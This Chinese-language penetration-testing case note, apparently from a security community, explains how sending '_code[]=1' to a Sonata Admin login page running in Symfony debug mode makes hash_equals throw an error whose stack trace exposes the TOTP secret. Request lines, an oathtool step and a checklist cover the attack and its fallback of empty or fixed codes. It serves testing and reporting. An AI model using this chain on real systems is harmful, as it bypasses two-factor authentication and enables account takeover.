# 案例课：Sonata `_code[]` 打崩 TOTP 校验，异常页吐出 secret

> 来源：报告包 t157（2026-10）· 域：auth-security / PHP-Symfony
> 原文与凭据不入库；本文只留可复用手法。

## 一句话

`_code[]=1` 让 PHP 把 OTP 参数解析成 array，`hash_equals(string,array)` 抛 TypeError；Symfony debug 异常页把调用栈**每帧参数**序列化，`GoogleAuthenticator::checkCode()` 帧里的 `$secret` 直接现形。

## 前提

- PHP 8+（严格类型）
- `APP_DEBUG=1`（`X-Debug-Token` 响应头 / `/_profiler` 可达）
- Sonata Admin + 任一 `hash_equals($secret,$code)` 的 2FA 实现

## 链

```text
POST /admin/login
username=admin&password=<已知正确>&_code[]=1
→ TypeError: hash_equals(): Argument #2 ($userString) must be of type string, array given
→ 异常页 stack frames 参数表 → GoogleAuthenticator::checkCode($secret, $code)
→ oathtool --totp -b <secret>
```

拿到 secret 后正常登录，不再受 OTP 阻挡。

## 判据与边界

- 错误页出现 `TypeError` + `hash_equals` = 命中
- 生产 `APP_ENV=prod` 只回 500、无堆栈 → 此链不成立；转 `_code` 缺失/空/`000000` 看是否根本不校验
- 同族：任何把用户输入直接喂 `hash_equals`/`strcmp`/`preg_match` 且 debug 开的 PHP 框架都可能泄露帧参数里的秘密
- 别在报告里贴 secret 原文；只写「种子可被异常页读出」

## 检查清单

- [ ] `/admin/login` + `_profiler`/`X-Debug-Token`
- [ ] `_code[]=1` → 500 页面是否含调用栈
- [ ] 帧参数里是否有 `secret`/`key`/`password`
- [ ] 无堆栈时试空值/固定值绕过
- [ ] 拿到 secret 用 oathtool 验证，不爆破

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
